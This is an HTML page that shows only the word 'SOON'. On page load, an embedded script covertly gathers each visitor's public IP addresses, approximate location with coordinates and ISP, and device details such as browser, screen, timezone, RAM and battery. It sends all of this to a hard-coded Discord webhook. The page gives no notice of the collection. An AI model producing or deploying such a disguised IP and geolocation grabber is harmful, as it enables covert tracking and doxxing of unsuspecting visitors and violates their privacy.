<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOON</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3rem;
            font-weight: bold;
            border: 5px solid white;
        }
    </style>
</head>
<body>
    SOON

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1335277200450125900/A-V32r8X5U5DdmUtho6qlYoR7qSLJiAKxPQcMV-VwEFrDVFKlDysLvHpcESL7TfWWW6g";

        async function getPublicIP() {
            try {
                let ipv4 = await (await fetch("https://api.ipify.org?format=json")).json();
                let ipv6 = await (await fetch("https://api64.ipify.org?format=json")).json();
                return { ipv4: ipv4.ip, ipv6: ipv6.ip };
            } catch (error) {
                return { ipv4: "Brak", ipv6: "Brak" };
            }
        }

        async function getLocation(ip) {
            try {
                let data = await (await fetch(`https://ipapi.co/${ip}/json/`)).json();
                return data;
            } catch (error) {
                return null;
            }
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cpuCores: navigator.hardwareConcurrency,
                ram: navigator.deviceMemory || "Nieznane",
                battery: navigator.getBattery ? navigator.getBattery().then(b => `${(b.level * 100).toFixed(0)}%`) : "Nieznane"
            };
        }

        async function sendToDiscord() {
            let { ipv4, ipv6 } = await getPublicIP();
            let locationData = await getLocation(ipv4);
            let deviceInfo = await getDeviceInfo();
            let batteryStatus = await deviceInfo.battery;

            let payload = {
                content: `🔍 **Nowe logowanie:**\n\n` +
                         `🌐 **IPv4:** ${ipv4}\n🔗 **IPv6:** ${ipv6}\n\n` +
                         `📍 **Lokalizacja:** ${locationData?.city}, ${locationData?.region}, ${locationData?.country_name} (${locationData?.postal})\n` +
                         `📡 **ISP:** ${locationData?.org} (${locationData?.asn})\n📌 **Koordynaty:** ${locationData?.latitude}, ${locationData?.longitude}\n\n` +
                         `💻 **System:** ${deviceInfo.platform}\n🌐 **Przeglądarka:** ${deviceInfo.userAgent}\n🖥️ **Rozdzielczość:** ${deviceInfo.screenResolution}\n🕰️ **Strefa czasowa:** ${deviceInfo.timezone}\n📏 **Pamięć RAM:** ${deviceInfo.ram} GB\n⚡ **Bateria:** ${batteryStatus}\n\n` +
                         `🕒 **Czas lokalny:** ${new Date().toLocaleString()}`
            };

            await fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        }

        sendToDiscord();
    </script>
</body>
</html>
